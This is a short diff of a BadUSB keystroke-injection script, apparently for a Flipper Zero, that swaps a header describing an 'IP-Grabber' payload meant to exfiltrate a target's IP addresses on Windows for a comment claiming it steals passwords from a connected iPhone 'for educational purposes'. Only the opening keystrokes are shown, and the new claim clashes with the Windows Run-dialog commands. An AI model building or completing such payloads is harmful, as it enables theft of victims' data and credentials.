@@ -1,10 +1,4 @@
-REM     Title: IP-Grabber
-
-REM     Author: I am Jakoby
-
-REM     Description: This payload is meant to do grab your targets IP addresses and exfil them
-
-REM     Target: Windows 10, 11
+REM     This takes passwords from the usb connected iPhone and shows them on your flipper. This is for educational perposes only. I encourage you not to do illigal activity.
 
 GUI r
 DELAY 500
